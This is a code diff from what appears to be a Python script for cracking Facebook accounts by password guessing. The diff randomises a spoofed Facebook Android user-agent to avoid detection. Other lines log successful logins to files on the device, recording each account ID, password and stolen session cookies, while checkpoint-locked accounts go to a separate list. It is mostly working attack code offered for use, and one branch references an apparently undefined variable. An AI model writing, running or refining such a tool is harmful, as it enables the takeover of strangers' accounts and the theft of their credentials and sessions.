@@ -53,7 +53,7 @@ def CEN():
 	density = random.choice(['2.0', '2.5', '3.0'])
 	width = random.choice(["720", "1080", "1280"])
 	height = random.choice(["720", "1080", "1280", "1440", "1920"])
-	ua = f"[FBAN/FB4A;FBAV/97.0.0.6993;FBBV/1826100[FBAN/FB4A;FBAV/43.0.0.35.44;FBBV/524525165;FBDM/{density=2.5,width=780,height=1920};FBLC/es_AR;FBRV/565339824;FBCR/Alfa Lebanon;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Hot 10;FBSV/8.0;FBBK/1;FBOP/1;FBCA/armv7-a;]"
+	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/MTN-CG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]"
 	return ua
 #__________________LOGO____________#
 logo=(f"""
@@ -317,15 +317,16 @@ def M1(ids,names,psd):
             if 'access_token' in po:
                 print(f'\r\r{A}[{G1}CEN-OK{A}]{G1} {ids} {A}|{G1} {pas}')
                 coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                open('/sdcard/CEN-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/CENT-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                 ok.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
                 #print(f'\r\r{A}[{M}CEN-PODLOCK{A}]{M} {ids} {A}|{M} {pas}')
-                open('/sdcard/CEN-FILE-PODLOCK.txt','a').write(ids+'|'+pas+'\n')
+                open('/sdcard/CENT-FILE-PODLOCK.txt','a').write(ids+'|'+pas+'\n')
             else:continue
         loop+=1
     except Exception as e:
         pass
 if __name__ == '__main__':
     menu()
+   
